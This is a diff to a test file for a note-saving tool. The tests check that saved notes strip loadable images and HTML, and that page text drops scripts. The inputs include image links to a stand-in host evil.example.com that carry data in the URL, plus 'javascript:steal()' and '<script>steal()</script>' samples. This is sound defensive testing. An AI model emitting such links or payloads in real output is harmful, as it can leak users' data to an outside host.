@@ -312,12 +312,18 @@ describe("fleet context add", () => {
   test("a saved note and the catalog hold no image or HTML that a viewer would load", async () => {
     const machine = await library();
     await fleetContext(machine, ["sync"]);
-    const loading = `![chart](https://evil.example.com/?d=plan) ![x][ref] <img src="https://evil.example.com/a"> <IMG/src=https://evil.example.com/b> <svg><image href="https://evil.example.com/c"/></svg> <!-- x -->\n\n[ref]: https://evil.example.com/d`;
-    const text = planning(loading).replace("title: Sprint planning 2026-11-11", "title: Sprint planning <img src=https://evil.example.com/e> 2026-11-11");
+    const loading = `![chart](https://evil.example.com/?d=plan) ![x][ref] <img src="https://evil.example.com/a"> <IMG/src=https://evil.example.com/b> <svg><image href="https://evil.example.com/c"/></svg> <!-- x --> !![two](https://evil.example.com/f) !!![three][ref]\n\n[ref]: https://evil.example.com/d\n\n\`\`\`mermaid\nflowchart LR\n  A@{ img: "https://evil.example.com/g" }\n\`\`\`\n\n   ~~~~ base\nviews: []\n~~~~\n\n\`\`\`\nplain\n\`\`\``;
+    const text = planning(loading)
+      .replace("title: Sprint planning 2026-11-11", "title: Sprint planning <img src=https://evil.example.com/e> 2026-11-11\nbanner: https://evil.example.com/h\ncover:\n  - https://evil.example.com/i\ncssclasses: [x]");
     expect((await fleetContext(machine, ["add", slackSource], drafting(notePath, text))).code).toBe(0);
     const saved = await spawnGit(machine.root, "--git-dir", machine.remote, "show", `main:${notePath}`);
     expect(saved).not.toMatch(/!\[|<[a-z/!?]/i);
     expect(saved).toContain("[chart](https://evil.example.com/?d=plan)");
+    expect(saved).toStartWith(`---\ntitle: Sprint planning &lt;img src=https://evil.example.com/e> 2026-11-11\ntype: planning\ntopics: [transactional-email, load-testing]\ndate: 2026-11-11\nsource: ${slackSource}\n---\n`);
+    expect(saved).toContain("\`\`\`text\nflowchart LR");
+    expect(saved).toContain("   ~~~~text\nviews: []\n~~~~\n");
+    expect(saved).toContain("\`\`\`\nplain\n\`\`\`");
+    expect(saved).not.toContain("mermaid");
     expect(await spawnGit(machine.root, "--git-dir", machine.remote, "show", "main:CATALOG.md")).not.toMatch(/!\[|<(img|svg|image)/i);
   });
 
@@ -517,6 +523,7 @@ console.log(JSON.stringify({ type: "result", is_error: false, structured_output:
   test("turns a page of unclosed tags into text without slowing down", async () => {
     const { pageText } = await import("./lib/source.ts");
     for (const unit of ["<a x>y ", "<script>", "<!-- ", "<x ", '<p "', "<a href='"]) pageText(unit.repeat(Math.floor(200_000 / unit.length)), "https://example.com/");
+    expect(pageText("<a href=r>t</a>".repeat(50_000), `https://example.com/${"d/".repeat(500)}`).length).toBeLessThan(1_000_000);
   }, 2000);
 
   test("keeps the thread and every canvas it could read when one canvas cannot be read", async () => {
@@ -533,6 +540,7 @@ console.log(JSON.stringify({ type: "result", is_error: false, structured_output:
     const html = `<html><head><title>Plan &amp; scope</title><script>steal()</script><style>p{}</style></head><body><p data-x="a>b">Load&nbsp;test &#x2192; ship&#0; &mdash; <a href="/spec?x=1&amp;y=2">the spec</a>, <a href="javascript:steal()">bad</a> <a data-href="https://evil.example.com/" href="/real">real</a></p><!-- hidden --></body></html>`;
     expect(await readPage(url, answering(html, "text/html; charset=utf-8"))).toBe("Plan & scope\nLoad test → ship — the spec (https://example.com/spec?x=1&y=2), bad real (https://example.com/real)");
     expect(await readPage(url, answering("# Notes", "text/markdown"))).toBe("# Notes");
+    expect(await readPage(url, answering("<svg/><p>Release notes</p><template-card>Meeting notes</template-card><svg><text>art</text></svg>", "text/html"))).toBe("Release notes\nMeeting notes");
     await expect(readPage(url, answering("x", "text/html", 404))).rejects.toThrow(`${url} answered HTTP 404`);
     await expect(readPage(url, answering("x", "application/pdf"))).rejects.toThrow("cannot read as text");
   });
